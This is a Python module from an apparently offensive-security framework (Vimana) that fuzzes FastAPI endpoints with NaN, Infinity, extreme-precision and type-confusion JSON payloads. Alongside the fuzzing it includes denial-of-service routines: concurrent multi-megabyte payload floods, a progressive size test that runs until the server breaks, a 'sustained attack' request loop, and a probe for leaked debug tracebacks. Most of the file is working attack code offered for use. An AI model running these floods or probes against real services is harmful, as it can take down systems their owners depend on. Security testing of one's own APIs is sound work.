#!/usr/bin/env python3
#  __ _
#   \/imana 2016
#   [|-ramewørk
#
#
# Author: s4dhu
# Email: <s4dhul4bs[at]prontonmail[dot]ch
# Git: @s4dhulabs
# Mastodon: @s4dhu
# 
# This file is part of Vimana Framework Project.


import asyncio
import aiohttp
import json
import time
import statistics
import sys
import math
import os
from concurrent.futures import ThreadPoolExecutor
import threading
import psutil
import requests
from dataclasses import dataclass
from typing import List, Dict, Any, Optional
import argparse
from tqdm import tqdm
from colorama import Fore, Style, init
import struct
import decimal
from core._dbops_.vmnf_dbops import VFDBOps  # Import VFDBOps for spec handling



@dataclass
class TestResult:
    """Store results of individual test requests"""
    status_code: int
    response_time: float
    error_type: str = ""
    success: bool = False
    error_message: str = ""
    test_vector: str = ""
    payload_type: str = ""
    response_size: int = 0

class FloatingPointVectors:
    """Generate various floating-point edge cases for testing"""
    
    def __init__(self, vmnf_handler=None):
        self.vmnf_handler = vmnf_handler or {}
        self.debug_enabled = self.vmnf_handler.get('debug')

    @staticmethod
    def ieee_754_edge_cases():
        """Standard IEEE 754 edge cases"""
        return {
            'nan': float('nan'),
            'positive_infinity': float('inf'),
            'negative_infinity': float('-inf'),
            'positive_zero': 0.0,
            'negative_zero': -0.0,
            'max_float': 1.7976931348623157e+308,
            'min_float': -1.7976931348623157e+308,
            'min_positive': 5e-324,  # Smallest positive subnormal
            'max_subnormal': 2.225073858507201e-308
        }
    
    @staticmethod
    def precision_attack_vectors():
        """High-precision numbers that might cause parsing issues"""
        return {
            'extreme_precision': 1.123456789012345678901234567890123456789,
            'repeating_decimal': 1/3,  # 0.3333...
            'very_long_decimal': float('0.' + '1' * 1000),
            'scientific_notation_large': 1.23e+308,
            'scientific_notation_small': 1.23e-308,
            'almost_overflow': 1.7976931348623156e+308,
            'almost_underflow': 1e-323
        }
    
    @staticmethod
    def malformed_number_strings():
        """Strings that might be parsed as numbers in edge cases"""
        return [
            "1.7976931348623157e+309",  # Overflow
            "1e-400",  # Underflow
            "9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
            "0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001",
            "1" + "0" * 1000,  # Very large integer
            "." + "9" * 1000,  # Very long decimal
            "1.23" + "4" * 1000,  # Very long precision
        ]
    
    @staticmethod
    def mathematical_edge_cases():
        """Values that might cause mathematical edge cases"""
        return {
            'sqrt_negative': float('nan'),  # math.sqrt(-1) equivalent
            'log_zero': float('-inf'),  # log(0)
            'log_negative': float('nan'),  # log(-1)
            'division_by_zero_pos': float('inf'),  # 1/0
            'division_by_zero_neg': float('-inf'),  # -1/0
            'zero_division': float('nan'),  # 0/0
            'inf_minus_inf': float('nan'),  # inf - inf
            'inf_division': float('nan'),  # inf / inf
        }
    
    @staticmethod
    def type_confusion_vectors():
        """Values that might cause type confusion"""
        return [
            True,  # Boolean that might be treated as 1.0
            False,  # Boolean that might be treated as 0.0
            None,  # Null that might cause issues
            "",  # Empty string
            "true",  # String boolean
            "false",  # String boolean
            "null",  # String null
            [],  # Empty array
            {},  # Empty object
        ]

    def run_spec_tests(self, spec, target_url, test_type=None, filter_by_method=None, filter_by_tag=None, filter_by_opid=None, endpoint=None, verbose=False):
        """
        Run float fuzzing tests against all endpoints/methods in the OpenAPI spec,
        applying filters and running the selected or all test types.
        """
        results = []
        analysis = {}
        tested_endpoints = []
        tester_class = FastAPIExhaustionTester
        
        # Normalize filters
        filter_methods = [m.strip().lower() for m in filter_by_method.split(',')] if filter_by_method else None
        filter_tags = [t.strip().lower() for t in filter_by_tag.split(',')] if filter_by_tag else None
        filter_opids = [o.strip().lower() for o in filter_by_opid.split(',')] if filter_by_opid else None
        filter_endpoint = endpoint
        
        # All available test types
        all_test_types = [
            "ieee754", "precision", "mathematical", "confusion", "single", "concurrent", "progressive", "sustained", "comprehensive"
        ]
        if not test_type:
            test_types_to_run = ["ieee754", "precision", "mathematical", "confusion"]
        else:
            test_types_to_run = [test_type]
        
        if self.debug_enabled:
            print(f"[FFF-DEBUG] Spec has {len(spec.get('paths', {}))} paths.")

        for api_path, methods in spec.get('paths', {}).items():
            for method, properties in methods.items():
                method_l = method.lower()
                opid = properties.get('operationId', '').lower()
                tags = [t.lower() for t in properties.get('tags', [])]
                
                # Debug print for filtering
                if self.debug_enabled:
                    print(f"[FFF-DEBUG] Considering {method.upper()} {api_path} (opid: {opid}, tags: {tags})")
                
                if filter_methods and method_l not in filter_methods:
                    if self.debug_enabled:
                        print(f"[FFF-DEBUG] Skipping {method.upper()} {api_path} due to method filter.")
                    continue
                if filter_tags and not any(tag in filter_tags for tag in tags):
                    if self.debug_enabled:
                        print(f"[FFF-DEBUG] Skipping {method.upper()} {api_path} due to tag filter.")
                    continue
                if filter_opids and opid not in filter_opids:
                    if self.debug_enabled:
                        print(f"[FFF-DEBUG] Skipping {method.upper()} {api_path} due to opid filter.")
                    continue
                if filter_endpoint and filter_endpoint != api_path:
                    if self.debug_enabled:
                        print(f"[FFF-DEBUG] Skipping {method.upper()} {api_path} due to endpoint filter.")
                    continue
                if self.debug_enabled:
                    print(f"[FFF-DEBUG] Testing {method.upper()} {api_path} with test types: {test_types_to_run}")
                tested_endpoints.append(f"{method.upper()} {api_path}")
                for ttype in test_types_to_run:
                    url = target_url.rstrip('/') + api_path
                    tester = tester_class(target_url, api_path)
                    suite_results = []
                    if ttype == "ieee754":
                        suite_results = tester.ieee_754_test_suite()
                    elif ttype == "precision":
                        suite_results = tester.precision_attack_suite()
                    elif ttype == "mathematical":
                        suite_results = tester.mathematical_edge_case_suite()
                    elif ttype == "confusion":
                        suite_results = tester.type_confusion_suite()
                    elif ttype == "single":
                        payload = tester.create_nan_payload()
                        result = tester.single_request_test(payload, test_vector="basic_nan", payload_type="single_test")
                        suite_results = [result]
                    elif ttype == "concurrent":
                        num_requests = self.vmnf_handler.get('requests', 10)
                        payload_size = self.vmnf_handler.get('payload_size', 1)
                        max_workers = self.vmnf_handler.get('max_workers', 5)
                        suite_results = tester.concurrent_test(num_requests, payload_size, max_workers)
                    elif ttype == "progressive":
                        results_dict = tester.progressive_size_test(
                            self.vmnf_handler.get('start_size_mb', 1),
                            self.vmnf_handler.get('max_size_mb', 20),
                            self.vmnf_handler.get('step_mb', 2)
                        )
                        suite_results = list(results_dict.values())
                    elif ttype == "sustained":
                        duration = self.vmnf_handler.get('duration', 60)
                        request_delay = self.vmnf_handler.get('request_delay', 0.5)
                        suite_results = tester.sustained_attack_test(duration, request_delay)
                    elif ttype == "comprehensive":
                        suite_results = tester.comprehensive_float_test_suite()
                    else:
                        continue
                    results.extend(suite_results)
        if results:
            analysis = tester.analyze_results(results)
        if self.debug_enabled:
            print("\n[FFF] Endpoints/methods tested:")
            for ep in tested_endpoints:
                print(f"  - {ep}")
                
        return results, analysis

class FastAPIExhaustionTester:
    def __init__(self, target_url: str, endpoint: str = None):
        # Handle target URL and endpoint properly
        self.target_url = target_url.rstrip('/')
        
        # If endpoint is provided in target_url, use it
        if '/' in self.target_url.split('://', 1)[1]:
            base_url, path = self.target_url.split('://', 1)
            self.target_url = f"{base_url}://{path.split('/', 1)[0]}"
            self.endpoint = f"/{path.split('/', 1)[1]}"
        else:
            self.endpoint = endpoint or "/type-confusion/process"
        
        self.full_url = f"{self.target_url}{self.endpoint}"
        self.vectors = FloatingPointVectors()
        
    def create_nan_payload(self, large_string_size: int = 1000) -> str:
        """Create payload with NaN that will trigger the vulnerability"""
        # Create a large string to potentially amplify memory usage
        large_string = "A" * large_string_size
        
        payload = {
            "string_field": large_string,
            "float_field": "NaN",  # Will be converted to actual NaN
            "bool_field": False
        }
        
        # Convert to JSON string and replace "NaN" with actual NaN
        json_str = json.dumps(payload)
        json_str = json_str.replace('"NaN"', 'NaN')
        
        return json_str
    
    def create_large_payload(self, size_mb: int = 10) -> str:
        """Create payload with large data that will consume memory during exception handling"""
        # Create large string data
        large_data = "X" * (size_mb * 1024 * 1024)  # size_mb MB of data
        
        payload = {
            "string_field": large_data,
            "float_field": "NaN",
            "bool_field": False,
            "extra_data": list(range(10000))  # Additional data to increase memory usage
        }
        
        json_str = json.dumps(payload)
        json_str = json_str.replace('"NaN"', 'NaN')
        
        return json_str
    
    def create_float_payload(self, test_value: Any, field_name: str = "float_field", 
                           include_amplifier: bool = False, amplifier_size: int = 1000) -> str:
        """Create payload with specific floating-point test value"""
        
        # Base payload structure
        payload = {
            "string_field": "test" if not include_amplifier else "A" * amplifier_size,
            field_name: test_value,
            "bool_field": False
        }
        
        # Add additional fields that might trigger validation errors
        if include_amplifier:
            payload.update({
                "extra_array": list(range(100)),
                "nested_object": {
                    "inner_float": test_value,
                    "inner_string": "B" * amplifier_size
                }
            })
        
        # Convert to JSON and handle special float values
        try:
            json_str = json.dumps(payload, allow_nan=False)
        except ValueError:
            # Handle NaN/Infinity by manual replacement
            json_str = json.dumps(payload, default=str)
            # Replace string representations with actual values
            replacements = {
                '"nan"': 'NaN',
                '"inf"': 'Infinity', 
                '"-inf"': '-Infinity',
                '"Infinity"': 'Infinity',
                '"-Infinity"': '-Infinity'
            }
            
            for old, new in replacements.items():
                json_str = json_str.replace(old, new)
        
        return json_str
    
    def create_precision_attack_payload(self, precision_digits: int = 1000) -> str:
        """Create payload with extreme precision numbers"""
        # Create number with extreme decimal precision
        decimal_part = "1" * precision_digits
        extreme_number = f"1.{decimal_part}"
        
        payload = {
            "string_field": "precision_test",
            "float_field": extreme_number,  # Will be converted
            "bool_field": False,
            "precision_array": [extreme_number] * 10
        }
        
        return json.dumps(payload).replace(f'"{extreme_number}"', extreme_number)
    
    def single_request_test(self, payload: str, timeout: int = 30, test_vector: str = "", payload_type: str = "") -> TestResult:
        """Send a single request and measure response"""
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Origin': self.target_url,
            'Connection': 'close'
        }
        
        start_time = time.time()
        
        try:
            response = requests.post(
                self.full_url,
                data=payload,
                headers=headers,
                timeout=timeout
            )
            
            response_time = time.time() - start_time
            
            result = TestResult(
                status_code=response.status_code,
                response_time=response_time,
                success=True,
                test_vector=test_vector,
                payload_type=payload_type,
                response_size=len(response.content)
            )
            
            # Analyze response for error types
            if response.status_code == 500:
                try:
                    error_data = response.json()
                    result.error_type = error_data.get('error_type', 'Unknown')
                    result.error_message = error_data.get('error', 'No error message')
                except:
                    result.error_type = "JSON_PARSE_ERROR"
                    result.error_message = "Could not parse error response"
            
            return result
            
        except requests.exceptions.Timeout:
            return TestResult(
                status_code=0,
                response_time=timeout,
                error_type="TIMEOUT",
                error_message="Request timed out",
                test_vector=test_vector,
                payload_type=payload_type
            )
        except requests.exceptions.ConnectionError:
            return TestResult(
                status_code=0,
                response_time=time.time() - start_time,
                error_type="CONNECTION_ERROR",
                error_message="Connection failed",
                test_vector=test_vector,
                payload_type=payload_type
            )
        except Exception as e:
            return TestResult(
                status_code=0,
                response_time=time.time() - start_time,
                error_type="EXCEPTION",
                error_message=str(e),
                test_vector=test_vector,
                payload_type=payload_type
            )
    
    def concurrent_test(self, num_requests: int = 10, payload_size_mb: int = 1, max_workers: int = 5) -> List[TestResult]:
        """Launch concurrent requests to test resource exhaustion"""
        print(Fore.CYAN + f"[*] Launching {num_requests} concurrent requests with {payload_size_mb}MB payloads...")
        payload = self.create_large_payload(payload_size_mb)
        results = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for i in range(num_requests):
                future = executor.submit(self.single_request_test, payload, 60, f"concurrent_{i}", "large_payload")
                futures.append(future)
            
            # Collect results with progress bar
            for i, future in enumerate(tqdm(futures, desc=Fore.MAGENTA + "Concurrent Requests", unit="req", colour='cyan')):
                try:
                    result = future.result(timeout=70)
                    results.append(result)
                    color = Fore.GREEN if 200 <= result.status_code < 300 else (Fore.YELLOW if 400 <= result.status_code < 500 else Fore.RED)
                    print(color + f"[+] Request {i+1}: Status {result.status_code}, Time: {result.response_time:.2f}s")
                except Exception as e:
                    print(Fore.RED + f"[-] Request {i+1} failed: {str(e)}")
                    results.append(TestResult(0, 0, "EXECUTOR_ERROR", str(e), test_vector=f"concurrent_{i}", payload_type="large_payload"))
        
        return results
    
    def progressive_size_test(self, start_size_mb: int = 1, max_size_mb: int = 50, step_mb: int = 5) -> Dict[int, TestResult]:
        """Test with progressively larger payloads to find breaking point"""
        print(Fore.CYAN + f"[*] Testing with payload sizes from {start_size_mb}MB to {max_size_mb}MB...")
        results = {}
        
        for size_mb in tqdm(range(start_size_mb, max_size_mb + 1, step_mb), desc=Fore.MAGENTA + "Progressive Size Test", unit="MB", colour='cyan'):
            print(Fore.CYAN + f"[*] Testing with {size_mb}MB payload...")
            payload = self.create_large_payload(size_mb)
            result = self.single_request_test(payload, 120, f"progressive_{size_mb}MB", "progressive_size")
            results[size_mb] = result
            
            color = Fore.GREEN if 200 <= result.status_code < 300 else (Fore.YELLOW if 400 <= result.status_code < 500 else Fore.RED)
            print(color + f"[+] {size_mb}MB: Status {result.status_code}, Time: {result.response_time:.2f}s")
            
            if result.status_code == 0:
                print(Fore.RED + f"[!] Reached breaking point at {size_mb}MB")
                break
            time.sleep(2)
        
        return results
    
    def sustained_attack_test(self, duration_seconds: int = 60, request_delay: float = 0.5) -> List[TestResult]:
        """Launch sustained attack for specified duration"""
        print(Fore.CYAN + f"[*] Launching sustained attack for {duration_seconds} seconds...")
        results = []
        start_time = time.time()
        request_count = 0
        total_requests = int(duration_seconds / request_delay)
        
        for _ in tqdm(range(total_requests), desc=Fore.MAGENTA + "Sustained Attack", unit="req", colour='cyan'):
            if time.time() - start_time >= duration_seconds:
                break
            
            payload = self.create_nan_payload(5000)  # 5KB string
            result = self.single_request_test(payload, 10, f"sustained_{request_count}", "sustained_attack")
            results.append(result)
            request_count += 1
            
            if request_count % 10 == 0:
                color = Fore.GREEN if 200 <= result.status_code < 300 else (Fore.YELLOW if 400 <= result.status_code < 500 else Fore.RED)
                print(color + f"[+] Sent {request_count} requests, last status: {result.status_code}")
            
            time.sleep(request_delay)
        
        print(Fore.CYAN + f"[*] Sustained attack complete. Sent {len(results)} requests.")
        return results
    
    # NEW ENHANCED FLOATING-POINT TEST SUITES
    
    def ieee_754_test_suite(self) -> List[TestResult]:
        """Test all IEEE 754 edge cases"""
        print(Fore.CYAN + "[*] Running IEEE 754 edge case tests...")
        results = []
        
        edge_cases = self.vectors.ieee_754_edge_cases()
        
        for name, value in tqdm(edge_cases.items(), desc="IEEE 754 Tests", colour='cyan'):
            # Test with minimal payload
            payload = self.create_float_payload(value)
            result = self.single_request_test(payload, 30, name, "ieee_754_minimal")
            results.append(result)
            
            # Test with amplified payload
            payload_amp = self.create_float_payload(value, include_amplifier=True, amplifier_size=5000)
            result_amp = self.single_request_test(payload_amp, 30, f"{name}_amplified", "ieee_754_amplified")
            results.append(result_amp)
            
            time.sleep(0.1)  # Small delay to avoid overwhelming server
        
        return results
    
    def precision_attack_suite(self) -> List[TestResult]:
        """Test precision-based attacks"""
        print(Fore.CYAN + "[*] Running precision attack tests...")
        results = []
        
        # Test extreme precision numbers
        for precision in [100, 500, 1000, 2000]:
            payload = self.create_precision_attack_payload(precision)
            result = self.single_request_test(payload, 60, f"precision_{precision}", "precision_attack")
            results.append(result)
            
            if result.status_code == 0:  # Server failed
                print(Fore.RED + f"[!] Server failed at precision {precision}")
                break
        
        # Test malformed number strings
        malformed = self.vectors.malformed_number_strings()
        for i, number_str in enumerate(malformed):
            payload = self.create_float_payload(number_str, "float_field")
            # Replace quoted number with unquoted for JSON parsing edge cases
            payload = payload.replace(f'"{number_str}"', number_str)
            result = self.single_request_test(payload, 30, f"malformed_{i}", "malformed_number")
            results.append(result)
        
        return results
    
    def mathematical_edge_case_suite(self) -> List[TestResult]:
        """Test mathematical edge cases"""
        print(Fore.CYAN + "[*] Running mathematical edge case tests...")
        results = []
        
        math_cases = self.vectors.mathematical_edge_cases()
        
        for name, value in tqdm(math_cases.items(), desc="Math Edge Cases", colour='cyan'):
            payload = self.create_float_payload(value)
            result = self.single_request_test(payload, 30, name, "mathematical_edge")
            results.append(result)
        
        return results
    
    def type_confusion_suite(self) -> List[TestResult]:
        """Test type confusion attacks"""
        print(Fore.CYAN + "[*] Running type confusion tests...")
        results = []
        
        confusion_vectors = self.vectors.type_confusion_vectors()
        
        for i, value in enumerate(confusion_vectors):
            payload = self.create_float_payload(value, "float_field")
            result = self.single_request_test(payload, 30, f"type_confusion_{type(value).__name__}_{i}", "type_confusion")
            results.append(result)
        
        return results
    
    def comprehensive_float_test_suite(self) -> List[TestResult]:
        """Run all floating-point test suites"""
        all_results = []
        
        print(Style.BRIGHT + Fore.MAGENTA + "="*60)
        print(Style.BRIGHT + Fore.MAGENTA + "FASTAPI FLOATING-POINT VULNERABILITY SCANNER")
        print(Style.BRIGHT + Fore.MAGENTA + "="*60)
        
        # Run each test suite
        all_results.extend(self.ieee_754_test_suite())
        all_results.extend(self.precision_attack_suite())
        all_results.extend(self.mathematical_edge_case_suite())
        all_results.extend(self.type_confusion_suite())
        
        return all_results
    
    def analyze_results(self, results: List[TestResult]) -> Dict[str, Any]:
        """Analyze test results and provide summary"""
        if not results:
            return {}
        
        successful_requests = [r for r in results if r.success and r.status_code != 0]
        failed_requests = [r for r in results if not r.success or r.status_code == 0]
        server_errors = [r for r in results if r.status_code == 500]
        cascade_failures = [r for r in results if r.status_code == 500 and "JSON compliant" in r.error_message]
        
        response_times = [r.response_time for r in successful_requests if r.response_time > 0]
        
        analysis = {
            'total_requests': len(results),
            'successful_requests': len(successful_requests),
            'failed_requests': len(failed_requests),
            'server_errors': len(server_errors),
            'cascade_failures': len(cascade_failures),
            'vulnerability_triggered': len(server_errors) > 0,
            'cascade_vulnerability_confirmed': len(cascade_failures) > 0,
            'avg_response_time': statistics.mean(response_times) if response_times else 0,
            'max_response_time': max(response_times) if response_times else 0,
            'min_response_time': min(response_times) if response_times else 0,
            'error_types': {},
            'payload_types': {},
            'vulnerable_vectors': []
        }
        
        # Count error types
        for result in results:
            if result.error_type:
                analysis['error_types'][result.error_type] = analysis['error_types'].get(result.error_type, 0) + 1
        
        # Count payload types  
        for result in results:
            if result.payload_type:
                analysis['payload_types'][result.payload_type] = analysis['payload_types'].get(result.payload_type, 0) + 1
        
        # Identify vulnerable vectors
        for result in server_errors:
            if result.test_vector and result.test_vector not in analysis['vulnerable_vectors']:
                analysis['vulnerable_vectors'].append(result.test_vector)
        
        return analysis
    
    def print_analysis(self, analysis: Dict[str, Any]):
        """Print formatted analysis results"""
        print("\n" + Style.BRIGHT + Fore.MAGENTA + "="*60)
        print(Style.BRIGHT + Fore.MAGENTA + "VULNERABILITY ANALYSIS RESULTS")
        print(Style.BRIGHT + Fore.MAGENTA + "="*60)
        print(Fore.CYAN + f"Total Requests: {analysis['total_requests']}")
        print(Fore.GREEN + f"Successful Requests: {analysis['successful_requests']}")
        print(Fore.RED + f"Failed Requests: {analysis['failed_requests']}")
        print(Fore.RED + f"Server Errors (500): {analysis['server_errors']}")
        print(Fore.RED + f"Cascade Failures: {analysis['cascade_failures']}")
        
        if analysis['cascade_vulnerability_confirmed']:
            print(Style.BRIGHT + Fore.RED + "\n[!] FASTAPI FLOATING-POINT CASCADE VULNERABILITY CONFIRMED!")
            print(Fore.RED + f"    Cascade failures detected: {analysis['cascade_failures']}")
        elif analysis['vulnerability_triggered']:
            print(Style.BRIGHT + Fore.YELLOW + "\n[!] Server errors detected - possible vulnerabilities")
        else:
            print(Style.BRIGHT + Fore.GREEN + "\n[+] No vulnerabilities detected - server may be patched")
        
        if analysis['vulnerable_vectors']:
            print(Fore.YELLOW + f"\nVulnerable test vectors: {', '.join(analysis['vulnerable_vectors'])}")
        
        if analysis['avg_response_time'] > 0:
            print(Fore.CYAN + f"\nResponse Time Analysis:")
            print(Fore.CYAN + f"  Average: {analysis['avg_response_time']:.2f}s")
            print(Fore.CYAN + f"  Maximum: {analysis['max_response_time']:.2f}s")
            print(Fore.CYAN + f"  Minimum: {analysis['min_response_time']:.2f}s")
            
            if analysis['max_response_time'] > 5:
                print(Fore.RED + f"  [!] Slow responses detected - possible DoS vector")
        
        if analysis['error_types']:
            print(Fore.YELLOW + f"\nError Types Encountered:")
            for error_type, count in analysis['error_types'].items():
                print(Fore.YELLOW + f"  {error_type}: {count}")
        
        if analysis['payload_types']:
            print(Fore.CYAN + f"\nPayload Types Tested:")
            for payload_type, count in analysis['payload_types'].items():
                print(Fore.CYAN + f"  {payload_type}: {count}")
        
        print(Style.BRIGHT + Fore.MAGENTA + "="*60)

    def check_debug_mode(self, verbose: bool = False) -> Dict[str, Any]:
        """Check if FastAPI is running in debug mode by sending a NaN payload"""
        print(Fore.CYAN + "[*] Checking if FastAPI is running in debug mode...")
        
        # Create a payload with NaN that will trigger the vulnerability
        payload = self.create_nan_payload()
        
        try:
            response = requests.post(
                self.full_url,
                data=payload,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Origin': self.target_url,
                    'Connection': 'close'
                },
                timeout=30
            )
            
            # Check response for debug mode indicators
            debug_enabled = False
            debug_indicators = []
            
            # Parse response content
            try:
                response_data = response.json()
                traceback_content = response_data.get('traceback', '')
                
                # Debug is enabled if we have a 500 AND a real traceback (not "Traceback hidden in secure mode")
                if response.status_code == 500 and traceback_content and "Traceback hidden in secure mode" not in traceback_content:
                    debug_enabled = True
                    debug_indicators.append("Full stacktrace found in response")
            except json.JSONDecodeError:
                # If response is not JSON, check raw content
                if response.status_code == 500 and "Traceback" in response.text and "Traceback hidden in secure mode" not in response.text:
                    debug_enabled = True
                    debug_indicators.append("Full stacktrace found in response")
            
            # Prepare result
            result = {
                'debug_enabled': debug_enabled,
                'status_code': response.status_code,
                'indicators': debug_indicators,
                'response_time': response.elapsed.total_seconds(),
                'headers': dict(response.headers) if verbose else None,
                'response_content': response.text if verbose else None
            }
            
            # Print results
            if debug_enabled:
                print(Fore.RED + "[!] Debug mode is ENABLED")
                print(Fore.YELLOW + f"    Indicators: {', '.join(debug_indicators)}")
            else:
                print(Fore.GREEN + "[+] Debug mode is DISABLED")
            
            if verbose:
                print(Fore.CYAN + "\nDetailed Response Information:")
                print(Fore.CYAN + f"Status Code: {response.status_code}")
                print(Fore.CYAN + f"Response Time: {response.elapsed.total_seconds():.2f}s")
                print(Fore.CYAN + "\nResponse Headers:")
                for header, value in response.headers.items():
                    print(Fore.CYAN + f"  {header}: {value}")
                print(Fore.CYAN + "\nResponse Content:")
                print(Fore.CYAN + response.text)
            
            return result
            
        except Exception as e:
            error_result = {
                'debug_enabled': False,
                'error': str(e),
                'error_type': type(e).__name__
            }
            print(Fore.RED + f"[-] Error checking debug mode: {str(e)}")
            return error_result

